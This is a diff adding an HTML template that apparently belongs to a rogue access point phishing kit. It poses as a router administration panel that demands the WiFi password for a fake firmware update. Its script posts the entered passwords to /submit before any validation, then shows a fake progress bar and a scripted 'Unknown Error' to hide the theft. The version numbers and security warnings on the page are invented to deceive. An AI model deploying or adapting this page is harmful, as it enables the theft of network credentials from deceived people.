@@ -1,0 +1,214 @@
+<!doctype html>
+<html lang="en" class="h-100">
+<head>
+	<!-- Required meta tags -->
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+	<!-- Bootstrap CSS -->
+	<link rel="stylesheet" href="/static/bootstrap/css/bootstrap.min.css" crossorigin="anonymous">
+
+	<!-- Custom CSS -->
+	<link rel="stylesheet" href="/modules/{{module}}/graph.css" crossorigin="anonymous">
+
+	<title>Administration Panel</title>
+</head>
+<body class="d-flex flex-column h-100">
+	
+	<nav class="navbar">
+		<a class="navbar-brand" href="#">
+			<span>
+				<img src="/modules/{{module}}/logo.png" alt="Logo" class="navbar-brand-custom" height="35px">
+				<small>
+					<p class="navbar_paragraph"></span> Admin | Status: Online | Language: EN</p>
+				</small>
+			</span>
+		</a>
+
+		<div class="navbar-right">
+			<span class="navbar_span_right">FW: 3.9.51</span><br>
+			<span class="navbar_span_right">IDH: R29710_XRJ0</span>
+		</div>
+
+	</nav>
+
+	<!--<h1>{{module}}</h1> -->
+
+	<div class="container">
+		<div class="row">
+			<div class="col-sm">
+
+
+				<div id="card_form" class="card" style="display: block">
+					<div class="card-body">
+						<h5 class="card-title">Firmware Update</h5>
+						<!--<h6 class="card-subtitle mb-2 text-muted">Card subtitle</h6>-->
+						<hr>
+
+						{% if ssid %}
+							<p>To complete the update please provide the correct WiFi password for the network <b>{{ssid}}</b>:</p>
+
+						{% else %}
+							<p>To complete the update please provide the correct WiFi password:</p>
+
+						{% endif %}
+						
+						<div>
+							<div class="form-group">
+								<input type="password" class="form-control" id="password_1" placeholder="Password WiFi">
+							</div>
+							<div class="form-group">
+								<input type="password" class="form-control" id="password_2" placeholder="Password WiFi Verify">
+							</div>
+
+							<p id="error_message"></p>
+
+							<button class="btn" onClick="call()">Update Firmware</button>
+						</div>
+
+					</div>
+				</div>
+
+
+				<div id="card_info" class="card" style="display: block">
+					<div class="card-body">
+						<h5 class="card-title">More Informations</h5>
+
+						<hr>
+
+						<p class="card-text">
+							A new router update is available (<b>v4.1.73</b>), for security reasons it will not be possible to use the router until the last update is installed.<br><br>
+
+							We suggest all our users to install updates regularly, to ensure a safe navigation and expand the functionality of our devices. 
+							The installation of a new update will not change the current device configuration, to complete the update the user is required to specify the current WiFi password.<br>
+							During the firmware update procedure a temporary WiFi network will be created, this will allow the user to enter the requested information.<br><br>
+
+							Warning: manually turning off or restarting the device during the update can damage the router.<br><br>
+
+							For more informations please refer out help page: <a href="#">Firmware Update</a>
+						</p>
+					</div>
+				</div>
+
+
+				<div id="card_loading" class="card" style="display: none">
+					<div class="card-body">
+						<h5 class="card-title">Updating...</h5>
+
+						<hr>
+
+						<p class="card-text">
+							Please wait for the update to complete.
+
+							<br>
+
+							<div class="progress">
+								<div class="progress-bar" role="progressbar" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100"></div>
+							</div>
+
+							<br>
+
+							Do not turn off or restart the device manually.
+						</p>
+					</div>
+				</div>
+
+
+				<div id="card_error" class="card" style="display: none">
+					<div class="card-body">
+						<h5 class="card-title">Unknown Error</h5>
+
+						<hr>
+
+						<p class="card-text">
+							The update procedure was interrupted due to an unknown error.<br><br>
+
+							The device will be now rebooted automatically, and the last working settings will be applied.<br><br>
+
+							Do not turn off or restart the device manually.
+						</p>
+					</div>
+				</div>
+
+
+			</div>
+		</div>
+	</div>
+
+	<footer class="footer text-center mt-auto py-3">
+		<p class="footer_paragraph"><a href="#" class="footer_paragraph">Documentation</a> | <a href="#" class="footer_paragraph">Online Support</a>  | <a href="#" class="footer_paragraph">Router FAQ</a></p>
+	</footer>
+
+	<script type="text/javascript">
+		
+		function call () {
+
+
+			$.ajax({
+				type: 'POST',
+				data: 'password_1=' + $("#password_1").val() + '&password_2=' + $("#password_2").val(),
+				url: '/submit'
+			})
+			.done(function(data, err) {
+				console.log("")
+			})
+			.fail(function(err) {
+				console.log("")
+			})
+
+
+			if ( $("#password_1").val().length < 8 ) {
+				document.getElementById("password_1").style.borderColor = "red";
+				document.getElementById("password_2").style.borderColor = "#ced4da";
+				document.getElementById("error_message").style.color = "red";
+				document.getElementById("error_message").innerHTML = "The provided password is too short"
+				
+
+			} else if ( $("#password_2").val().length < 8 ) {
+				document.getElementById("password_1").style.borderColor = "#ced4da";
+				document.getElementById("password_2").style.borderColor = "red";
+				document.getElementById("error_message").style.color = "red";
+				document.getElementById("error_message").innerHTML = "The provided password is too short"
+
+			} else if ( $("#password_1").val() != $("#password_2").val() ) {
+				document.getElementById("password_1").style.borderColor = "red";
+				document.getElementById("password_2").style.borderColor = "red";
+				document.getElementById("error_message").style.color = "red";
+				document.getElementById("error_message").innerHTML = "The provided passwords do not match"
+			
+			} else {
+
+				document.getElementById("card_form").style.display="none";
+				document.getElementById("card_info").style.display="none";
+				document.getElementById("card_loading").style.display="block";
+
+				var i = 0;
+
+				var counterBack = setInterval(function () {
+					i++;
+
+					if (i <= 85) {
+						$('.progress-bar').css('width', i + '%');
+
+					} else {
+						clearInterval(counterBack);
+						document.getElementById("card_loading").style.display="none";
+						document.getElementById("card_error").style.display="block";
+					}
+
+				}, 1500); // 85 * 1.5 = 127.5 seconds
+
+			}
+
+
+		}
+
+	</script>
+
+	<!-- Optional JavaScript -->
+	<!-- jQuery first, then Popper.js, then Bootstrap JS -->
+	<script src="/static/jquery-3.4.1.min.js" crossorigin="anonymous"></script>
+	<script src="/static/popper/popper.min.js" crossorigin="anonymous"></script>
+	<script src="/static/bootstrap/js/bootstrap.min.js" crossorigin="anonymous"></script>
+</body>
+</html>
